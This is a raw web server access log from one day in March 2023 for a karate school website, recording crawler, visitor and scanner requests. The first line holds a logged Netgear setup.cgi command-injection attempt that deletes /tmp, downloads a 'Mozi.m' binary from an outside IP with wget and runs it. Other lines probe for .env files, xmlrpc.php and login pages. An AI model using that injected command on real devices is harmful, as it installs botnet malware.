::ffff:121.11.190.16 - - [30/Mar/2023:00:05:53 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://121.11.190.167:42558/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 148 "-" "-"
::ffff:185.254.196.173 - - [30/Mar/2023:01:03:01 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:162.214.71.92 - - [30/Mar/2023:01:21:57 +0000] "GET / HTTP/1.1" 200 58146 "-" "curl/7.29.0"
::ffff:216.244.66.196 - - [30/Mar/2023:01:28:46 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
::ffff:216.244.66.196 - - [30/Mar/2023:01:33:54 +0000] "GET /contact?s=1&ss=2 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
::ffff:43.155.118.219 - - [30/Mar/2023:01:35:56 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:45.81.243.34 - - [30/Mar/2023:01:40:54 +0000] "GET / HTTP/1.1" 200 58146 "-" "-"
::ffff:45.81.243.34 - - [30/Mar/2023:01:40:55 +0000] "POST /HNAP1/ HTTP/1.1" 404 146 "-" "Mozila/5.0"
::ffff:103.243.82.230 - - [30/Mar/2023:01:45:46 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
::ffff:135.125.217.54 - - [30/Mar/2023:01:57:50 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.217.54 - - [30/Mar/2023:01:57:51 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:43.139.100.89 - - [30/Mar/2023:02:18:43 +0000] "GET /xmlrpc.php HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
::ffff:43.139.77.37 - - [30/Mar/2023:02:18:43 +0000] "GET /xmlrpc.php HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
::ffff:43.139.206.111 - - [30/Mar/2023:02:18:44 +0000] "GET /xmlrpc.php HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
::ffff:43.139.205.224 - - [30/Mar/2023:02:19:03 +0000] "GET /xmlrpc.php HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
::ffff:43.139.62.22 - - [30/Mar/2023:02:19:31 +0000] "GET /xmlrpc.php HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
::ffff:180.149.125.167 - - [30/Mar/2023:02:34:03 +0000] "GET /stalker_portal/server/tools/auth_simple.php HTTP/1.1" 404 182 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
::ffff:198.199.93.97 - - [30/Mar/2023:02:37:02 +0000] "GET /ReportServer HTTP/1.1" 404 151 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:107.170.226.7 - - [30/Mar/2023:02:41:39 +0000] "GET /login HTTP/1.1" 404 144 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:135.125.217.54 - - [30/Mar/2023:02:52:12 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.217.54 - - [30/Mar/2023:02:52:12 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:43.155.118.219 - - [30/Mar/2023:02:54:24 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:51.222.253.1 - - [30/Mar/2023:02:55:25 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.13 - - [30/Mar/2023:02:55:26 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.8 - - [30/Mar/2023:02:55:27 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.6 - - [30/Mar/2023:02:55:28 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.17 - - [30/Mar/2023:02:55:29 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.14 - - [30/Mar/2023:02:55:29 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.10 - - [30/Mar/2023:02:55:30 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.1 - - [30/Mar/2023:02:55:30 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.18 - - [30/Mar/2023:02:55:31 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.9 - - [30/Mar/2023:02:55:31 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.14 - - [30/Mar/2023:02:55:32 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.5 - - [30/Mar/2023:02:55:33 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.2 - - [30/Mar/2023:02:55:33 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.2 - - [30/Mar/2023:02:55:34 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.7 - - [30/Mar/2023:02:55:34 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:170.64.154.90 - - [30/Mar/2023:03:15:52 +0000] "GET /auth.asp HTTP/1.1" 404 147 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:193.32.162.159 - - [30/Mar/2023:03:18:53 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:193.32.162.159 - - [30/Mar/2023:03:18:58 +0000] "GET /dispatch.asp HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:216.244.66.196 - - [30/Mar/2023:03:21:18 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
::ffff:3.239.75.36 - - [30/Mar/2023:03:21:25 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
::ffff:3.239.75.36 - - [30/Mar/2023:03:21:36 +0000] "GET /dist/js/bootstrap.bundle.min.js HTTP/1.1" 404 170 "-" "Mozilla/5.0 (Linux; Android 9; VKY-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
::ffff:3.239.75.36 - - [30/Mar/2023:03:21:36 +0000] "GET /common.js HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG-SM-G930A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
::ffff:3.239.75.36 - - [30/Mar/2023:03:21:36 +0000] "GET /ie7/ie7-standard-p.js HTTP/1.1" 404 160 "-" "Mozilla/5.0 (iPad; CPU OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Mobile/15E148 Safari/604.1"
::ffff:3.239.75.36 - - [30/Mar/2023:03:22:13 +0000] "GET /common.js HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.302.2 Safari/532.8"
::ffff:3.239.75.36 - - [30/Mar/2023:03:22:13 +0000] "GET //code.jquery.com/jquery-3.2.1.min.js HTTP/1.1" 404 175 "-" "Mozilla/5.0 (Linux; Android 9; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
::ffff:3.239.75.36 - - [30/Mar/2023:03:22:13 +0000] "GET //cdn.js HTTP/1.1" 404 146 "-" "Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/0.8.12"
::ffff:3.239.75.36 - - [30/Mar/2023:03:22:13 +0000] "GET //cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js HTTP/1.1" 404 205 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
::ffff:3.239.75.36 - - [30/Mar/2023:03:22:13 +0000] "GET //code.jquery.com/jquery-3.2.1.slim.min.js HTTP/1.1" 404 180 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
::ffff:3.239.75.36 - - [30/Mar/2023:03:22:13 +0000] "GET //maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js HTTP/1.1" 404 199 "-" "SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0"
::ffff:3.239.75.36 - - [30/Mar/2023:03:22:13 +0000] "GET /dist/js/bootstrap.bundle.min.js HTTP/1.1" 404 170 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.108 Safari/537.36"
::ffff:3.239.75.36 - - [30/Mar/2023:03:22:14 +0000] "GET /ie7/ie7-standard-p.js HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 OPR/62.0.3331.88"
::ffff:216.244.66.196 - - [30/Mar/2023:03:23:48 +0000] "GET /contact HTTP/1.1" 200 10017 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
::ffff:193.32.162.159 - - [30/Mar/2023:03:49:47 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:193.32.162.159 - - [30/Mar/2023:03:49:53 +0000] "GET /dispatch.asp HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:141.95.74.78 - - [30/Mar/2023:03:51:32 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:141.95.74.78 - - [30/Mar/2023:03:51:33 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.191.45.212 - - [30/Mar/2023:04:04:02 +0000] "GET / HTTP/1.1" 200 58146 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
::ffff:20.191.45.212 - - [30/Mar/2023:04:04:03 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://www.wadokikai.org/images/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
::ffff:66.249.65.57 - - [30/Mar/2023:04:08:04 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.65.57 - - [30/Mar/2023:04:08:04 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 304 - "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.146 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:43.155.118.219 - - [30/Mar/2023:04:12:49 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:212.87.204.144 - - [30/Mar/2023:04:39:42 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:212.87.204.144 - - [30/Mar/2023:04:39:42 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:212.87.204.144 - - [30/Mar/2023:04:39:43 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:212.87.204.144 - - [30/Mar/2023:04:39:44 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:135.125.217.54 - - [30/Mar/2023:04:39:45 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.217.54 - - [30/Mar/2023:04:39:45 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:72.134.244.59 - - [30/Mar/2023:04:40:34 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "http://wadokikai.org/docs/Bushido-code.pdf" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"
::ffff:72.134.244.59 - - [30/Mar/2023:04:40:34 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 200 691794 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"
::ffff:114.119.141.133 - - [30/Mar/2023:04:40:55 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:67.164.112.215 - - [30/Mar/2023:04:44:08 +0000] "GET / HTTP/1.1" 200 58146 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1"
::ffff:67.164.112.215 - - [30/Mar/2023:04:44:08 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1"
::ffff:67.164.112.215 - - [30/Mar/2023:04:44:08 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "http://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1"
::ffff:67.164.112.215 - - [30/Mar/2023:04:44:08 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "http://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1"
::ffff:67.164.112.215 - - [30/Mar/2023:04:44:08 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1"
